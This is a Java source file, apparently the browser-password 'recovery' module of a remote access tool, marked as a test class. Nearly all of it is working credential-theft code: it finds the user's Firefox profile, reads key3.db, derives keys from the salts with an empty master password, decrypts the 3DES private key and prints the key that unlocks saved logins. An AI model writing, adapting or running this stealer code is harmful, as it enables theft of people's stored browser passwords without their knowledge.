package de.sogomn.rat.recovery;

import java.io.File;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.Optional;
import java.util.stream.Stream;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.Mac;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.swing.JOptionPane;

import de.sogomn.engine.util.FileUtils;

/*
 * TEST CLASS!!!
 */
public final class Firefox {
	
	private static final byte[] GLOBAL_SALT_KEY = "global-salt".getBytes();
	private static final int GLOBAL_SALT_LENGTH = 20;
	private static final byte[] PRIVATE_KEY_KEY = {(byte)0xF8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01};
	private static final int PRIVATE_KEY_ENTRY_SALT_LENGTH = 20;
	private static final int PRIVATE_KEY_ENTRY_SALT_OFFSET = 121;
	private static final int PADDED_ENTRY_SALT_LENGTH = 20;
	private static final int TRIPLE_DES_KEY_LENGTH = 24;
	private static final int INITIALIZING_VECTOR_LENGTH = 8;
	private static final int FINAL_TRIPLE_DES_DECRYPTION_KEY_LENGTH = 24;
	private static final int FINAL_TRIPLE_DES_DECRYPTION_KEY_OFFSET = 51;
	
	private static final byte[] PASSWORD_CHECK_KEY = "password-check".getBytes();
	private static final int PASSWORD_CHECK_LENGTH = 16;
	
	private Firefox() {
		//...
	}
	
	private static int indexOf(final byte[] data, final byte[] subData) {
		if (subData.length > data.length || data.length == 0 || subData.length == 0) {
			return -1;
		}
		
		final byte firstByte = subData[0];
		
		for (int i = 0; i < data.length; i++) {
			final byte b = data[i];
			
			boolean found = false;
			
			if (b == firstByte) {
				found = true;
				
				for (int j = 1; j < subData.length; j++) {
					final int index = i + j;
					
					if (index > data.length - 1) {
						return -1;
					}
					
					final byte dataByte = data[index];
					final byte testByte = subData[j];
					
					if (dataByte != testByte) {
						found = false;
						
						break;
					}
				}
			}
			
			if (found) {
				return i;
			}
		}
		
		return -1;
	}
	
	private static byte[] concatenate(final byte[] one, final byte[] two) {
		final int length = one.length + two.length;
		final byte[] array = new byte[length];
		
		System.arraycopy(one, 0, array, 0, one.length);
		System.arraycopy(two, 0, array, one.length, two.length);
		
		return array;
	}
	
	public static String toHex(final byte[] data) {
		final StringBuilder builder = new StringBuilder();
		
		for(final byte b : data) {
			final String hex = String.format("%02x", b);
			builder.append(hex);
	    }
	    
	    return builder.toString();
	}
	
	/*
	 * ====================================================================================================
	 * ====================================================================================================
	 * ====================================================================================================
	 */
	
	private static byte[] getGlobalSalt(final byte[] data) {
		final int to = indexOf(data, GLOBAL_SALT_KEY);
		final int from = to - GLOBAL_SALT_LENGTH;
		
		if (to != -1 && from > 0) {
			final byte[] globalSalt = Arrays.copyOfRange(data, from, to);
			
			return globalSalt;
		}
		
		return null;
	}
	
	private static byte[] getPasswordCheckEntrySalt(final byte[] data) {
		final int globalSaltKeyIndex = indexOf(data, GLOBAL_SALT_KEY);
		
		if (globalSaltKeyIndex != -1) {
			final int headerIndex = globalSaltKeyIndex + GLOBAL_SALT_KEY.length;
			final int length = data[headerIndex + 1];
			final int from = headerIndex + 3;
			final int to = from + length;
			final byte[] passwordCheckEntrySalt = Arrays.copyOfRange(data, from, to);
			
			return passwordCheckEntrySalt;
		}
		
		return null;
	}
	
	private static byte[] getPasswordCheck(final byte[] data) {
		final int to = indexOf(data, PASSWORD_CHECK_KEY);
		final int from = to - PASSWORD_CHECK_LENGTH;
		
		if (to != -1 && from > 0) {
			final byte[] passwordCheck = Arrays.copyOfRange(data, from, to);
			
			return passwordCheck;
		}
		
		return null;
	}
	
	private static byte[] getPrivateKeyEntrySalt(final byte[] data) {
		final int privateKeyIndex = indexOf(data, PRIVATE_KEY_KEY);
		final int from = privateKeyIndex - PRIVATE_KEY_ENTRY_SALT_OFFSET;
		final int to = from + PRIVATE_KEY_ENTRY_SALT_LENGTH;
		
		if (to != -1 && from > 0) {
			final byte[] privateKeyEntrySalt = Arrays.copyOfRange(data, from, to);
			
			return privateKeyEntrySalt;
		}
		
		return null;
	}
	
	private static byte[] getPrivateKey(final byte[] data) {
		final int to = indexOf(data, PRIVATE_KEY_KEY);
		final int from = to - PRIVATE_KEY_ENTRY_SALT_OFFSET + PRIVATE_KEY_ENTRY_SALT_LENGTH + 3 + 2;
		
		if (to != -1 && from > 0) {
			final byte[] privateKey = Arrays.copyOfRange(data, from, to);
			
			return privateKey;
		}
		
		return null;
	}
	
	private static byte[] decryptTripleDesCbc(final byte[] input, final byte[] key, final byte[] initializingVector) throws InvalidKeyException, InvalidAlgorithmParameterException, NoSuchAlgorithmException, NoSuchPaddingException, IllegalBlockSizeException, BadPaddingException {
		final SecretKeySpec secretKeySpec = new SecretKeySpec(key, "DESede");
		final IvParameterSpec initializingVectorSpec = new IvParameterSpec(initializingVector);
		final Cipher cipher = Cipher.getInstance("DESede/CBC/PKCS5Padding");
		
		cipher.init(Cipher.DECRYPT_MODE, secretKeySpec, initializingVectorSpec);
		
		final byte[] decrypted = cipher.doFinal(input);
		
		return decrypted;
	}
	
	private static byte[] getKey(final byte[] globalSalt, final byte[] entrySalt, final byte[] masterPassword) throws NoSuchAlgorithmException, InvalidKeyException {
		final MessageDigest sha1 = MessageDigest.getInstance("SHA-1");
		
		sha1.update(globalSalt);
		sha1.update(masterPassword);
		
		final byte[] hashedPassword = sha1.digest();
		
		sha1.update(hashedPassword);
		sha1.update(entrySalt);
		
		final byte[] combinedHashedPassword = sha1.digest();
		final Mac mac = Mac.getInstance("HmacSHA1");
		final SecretKeySpec macKey = new SecretKeySpec(combinedHashedPassword, "HmacSHA1");
		final byte[] paddedEntrySalt = Arrays.copyOf(entrySalt, PADDED_ENTRY_SALT_LENGTH);
		
		mac.init(macKey);
		mac.update(paddedEntrySalt);
		mac.update(entrySalt);
		
		final byte[] key1 = mac.doFinal();
		final byte[] tempKey = mac.doFinal(paddedEntrySalt);
		
		mac.update(tempKey);
		mac.update(entrySalt);
		
		final byte[] key2 = mac.doFinal();
		final byte[] key = concatenate(key1, key2);
		
		return key;
	}
	
	public static void main(final String[] args) {
		final File file = new File(System.getenv("APPDATA") + File.separator + "Mozilla/Firefox/Profiles");
		final File[] children = file.listFiles();
		
		if (children == null) {
			return;
		}
		
		final Optional<File> first = Stream.of(children).findFirst();
		
		if (!first.isPresent()) {
			return;
		}
		
		final File profile = first.get();
		final String path = profile.getAbsolutePath() + File.separator + "key3.db";
		
		final byte[] data = FileUtils.readExternalData(path);
		final byte[] masterPassword = "".getBytes();
		final byte[] globalSalt = getGlobalSalt(data);
		final byte[] privateKeyEntrySalt = getPrivateKeyEntrySalt(data);
		final byte[] privateKey = getPrivateKey(data);
		final byte[] passwordCheckEntrySalt = getPasswordCheckEntrySalt(data);
		final byte[] passwordCheck = getPasswordCheck(data);
		
		try {
			final byte[] passwordCheckKey = getKey(globalSalt, passwordCheckEntrySalt, masterPassword);
			final byte[] passwordCheckTripleDesKey = Arrays.copyOf(passwordCheckKey, TRIPLE_DES_KEY_LENGTH);
			final byte[] passwordCheckInitializingVector = Arrays.copyOfRange(passwordCheckKey, passwordCheckKey.length - INITIALIZING_VECTOR_LENGTH, passwordCheckKey.length);
			final byte[] passwordCheckClearText = decryptTripleDesCbc(passwordCheck, passwordCheckTripleDesKey, passwordCheckInitializingVector);
			final boolean valid = Arrays.equals(PASSWORD_CHECK_KEY, passwordCheckClearText);
			
			if (!valid) {
				System.err.println("Invalid master password!");
				
				return;
			}
			
			final byte[] privateDecryptionKey = getKey(globalSalt, privateKeyEntrySalt, masterPassword);
			final byte[] privateDecryptionKeyTripleDesKey = Arrays.copyOf(privateDecryptionKey, TRIPLE_DES_KEY_LENGTH);
			final byte[] privateDecryptionKeyInitializingVector = Arrays.copyOfRange(privateDecryptionKey, privateDecryptionKey.length - INITIALIZING_VECTOR_LENGTH, privateDecryptionKey.length);
			final byte[] decryptionKey = decryptTripleDesCbc(privateKey, privateDecryptionKeyTripleDesKey, privateDecryptionKeyInitializingVector);
			final byte[] finalDecryptionTripleDesKey = Arrays.copyOfRange(decryptionKey, FINAL_TRIPLE_DES_DECRYPTION_KEY_OFFSET, FINAL_TRIPLE_DES_DECRYPTION_KEY_OFFSET + FINAL_TRIPLE_DES_DECRYPTION_KEY_LENGTH);
			
			System.out.println(toHex(finalDecryptionTripleDesKey));
			
			JOptionPane.showMessageDialog(null, "WORKS!!!");
		} catch (final Exception ex) {
			JOptionPane.showMessageDialog(null, ex);
			
			ex.printStackTrace();
		}
	}
	
}
